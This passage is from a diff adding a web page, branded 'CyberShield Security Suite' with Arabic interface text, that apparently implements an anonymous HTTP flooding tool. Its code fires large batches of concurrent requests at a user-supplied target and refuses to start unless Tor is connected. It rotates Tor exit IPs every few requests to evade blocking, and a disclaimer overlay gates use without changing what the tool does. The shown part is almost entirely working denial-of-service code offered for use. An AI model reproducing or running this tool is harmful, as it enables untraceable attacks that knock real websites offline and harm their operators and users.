+                let threads = parseInt(threadsInput.value) || 100;
+                if (threads < 1) threads = 1;
+                if (threads > 9999) threads = 9999;
+
+                const rotation = parseInt(document.getElementById('rotationCount').value) || 20;
+                let reqSinceRot = 0;
+
+                setStatus('⚡ الهجوم قيد التنفيذ عبر Tor', 'active');
+                addLog(`بدء الهجوم على ${target} (${threads} خيط)`, 'info');
+                addLog(`Exit IP: ${torStatus.exitIp || 'غير معروف'}`, 'info');
+
+                startTime = Date.now();
+                let total = 0;
+                let successTotal = 0;
+                let failTotal = 0;
+
+                while (isRunning && !stopRequested) {
+                    const batch = Math.min(threads, 40);
+                    const promises = [];
+
+                    for (let i = 0; i < batch; i++) {
+                        if (!isRunning || stopRequested) break;
+
+                        if (document.getElementById('randomDelay').checked) {
+                            const delay = Math.floor(Math.random() * 100);
+                            if (delay > 0) await new Promise(r => setTimeout(r, delay));
+                        }
+
+                        promises.push(sendRequest(target));
+                        total++;
+                        reqSinceRot++;
+
+                        if (document.getElementById('ipRotation').checked && reqSinceRot >= rotation) {
+                            await rotateIp();
+                            reqSinceRot = 0;
+                        }
+                    }
+
+                    const results = await Promise.allSettled(promises);
+                    for (const r of results) {
+                        if (r.status === 'fulfilled' && r.value.success) {
+                            successTotal++;
+                        } else {
+                            failTotal++;
+                        }
+                    }
+
+                    packetCounter = total;
+                    successCounter = successTotal;
+                    failCounter = failTotal;
+
+                    const elapsed = (Date.now() - startTime) / 1000;
+                    const rate = elapsed > 0 ? Math.round(total / elapsed) : 0;
+
+                    packetSpan.textContent = packetCounter.toLocaleString();
+                    successSpan.textContent = successCounter.toLocaleString();
+                    failSpan.textContent = failCounter.toLocaleString();
+                    rateSpan.textContent = rate.toLocaleString();
+
+                    if (packetCounter % 30 === 0) {
+                        setStatus(`⚡ ${packetCounter.toLocaleString()} طلب (${rate}/ث)`, 'active');
+                    }
+
+                    await new Promise(r => setTimeout(r, 5));
+                }
+
+                attackLoopRunning = false;
+                isRunning = false;
+                stopRequested = false;
+                startBtn.disabled = false;
+                stopBtn.disabled = true;
+                setStatus('توقف الهجوم', 'idle');
+                addLog(`توقف - ناجح: ${successCounter} فاشل: ${failCounter}`, 'info');
+            }
+
+            // ============================================================
+            // START / STOP
+            // ============================================================
+            async function startAttack() {
+                if (!isAppEnabled) {
+                    setStatus('يرجى الموافقة على إخلاء المسؤولية أولاً', 'warning');
+                    return;
+                }
+
+                const target = targetInput.value.trim();
+                if (!target) {
+                    setStatus('يرجى إدخال هدف', 'warning');
+                    return;
+                }
+
+                if (isRunning) return;
+
+                setStatus('جاري التحقق من Tor...', 'warning');
+                await checkTor();
+
+                if (!torStatus.connected) {
+                    setStatus('Tor غير متصل - لا يمكن بدء الهجوم', 'error');
+                    addLog('الهجوم ملغي: يرجى تشغيل Orbot/Tor', 'error');
+                    return;
+                }
+
+                isRunning = true;
+                stopRequested = false;
+                packetCounter = 0;
+                successCounter = 0;
+                failCounter = 0;
+                ipChangeCounter = 0;
+
+                packetSpan.textContent = '0';
+                successSpan.textContent = '0';
+                failSpan.textContent = '0';
+                rateSpan.textContent = '0';
+
+                startBtn.disabled = true;
+                stopBtn.disabled = false;
+
+                setTimeout(() => attackLoop(), 100);
+            }
+
+            function stopAttack() {
+                if (!isRunning) return;
+                stopRequested = true;
+                isRunning = false;
+                startBtn.disabled = false;
+                stopBtn.disabled = true;
+                setStatus('جاري الإيقاف...', 'warning');
+                addLog('طلب إيقاف', 'warning');
+            }
+
+            // ============================================================
+            // EVENT BINDINGS
+            // ============================================================
+            startBtn.addEventListener('click', startAttack);
+            stopBtn.addEventListener('click', stopAttack);
+
+            targetInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') startAttack();
+            });
+
+            // ============================================================
+            // BLOCK USAGE BEFORE DISCLAIMER
+            // ============================================================
+            document.querySelectorAll('.btn, .form-control, .adv-toggle').forEach(el => {
+                el.addEventListener('click', function(e) {
+                    if (!isAppEnabled && !this.closest('.disclaimer-overlay') && !this.closest(
+                            '.sysinfo-overlay')) {
+                        e.preventDefault();
+                        const msg = document.createElement('div');
+                        msg.style.cssText = `
+                                    position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+                                    background: rgba(255,136,0,0.08); border: 1px solid #ff8800;
+                                    color: #ff8800; padding: 10px 20px; border-radius: 4px;
+                                    font-size: 12px; z-index: 9999;
+                                    font-family: 'Share Tech Mono', monospace;
+                                    animation: terminalFade 0.3s ease;
+                                `;
+                        msg.textContent = '⚠ ACCESS DENIED: يجب الموافقة على إخلاء المسؤولية أولاً';
+                        document.body.appendChild(msg);
+                        setTimeout(() => msg.remove(), 2500);
+                    }
+                }, true);
+            });
+
+            document.addEventListener('keydown', function(e) {
+                if (!isAppEnabled && e.key === 'Enter') {
+                    if (!disclaimerOverlay.classList.contains('active')) {
+                        const msg = document.createElement('div');
+                        msg.style.cssText = `
+                                    position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+                                    background: rgba(255,136,0,0.08); border: 1px solid #ff8800;
+                                    color: #ff8800; padding: 10px 20px; border-radius: 4px;
+                                    font-size: 12px; z-index: 9999;
+                                    font-family: 'Share Tech Mono', monospace;
+                                    animation: terminalFade 0.3s ease;
+                                `;
+                        msg.textContent = '⚠ ACCESS DENIED: يجب الموافقة على إخلاء المسؤولية أولاً';
+                        document.body.appendChild(msg);
+                        setTimeout(() => msg.remove(), 2500);
+                        e.preventDefault();
+                    }
+                }
+            });
+
+            // ============================================================
+            // STYLE FOR ANIMATIONS
+            // ============================================================
+            const style = document.createElement('style');
+            style.textContent = `
+                        @keyframes terminalFade {
+                            from { opacity: 0; }
+                            to { opacity: 1; }
+                        }
+                    `;
+            document.head.appendChild(style);
+
+            // ============================================================
+            // INIT
+            // ============================================================
+            console.log('🛡️ CyberShield Security Suite v3.2.1');
+            console.log('🔌 Tor SOCKS5: 127.0.0.1:9050');
+            console.log('🌐 HTTP Check: 127.0.0.1:3000');
+
+            updateProxyBadges();
+
+        })();
+    </script>
+
+</body>
+</html>
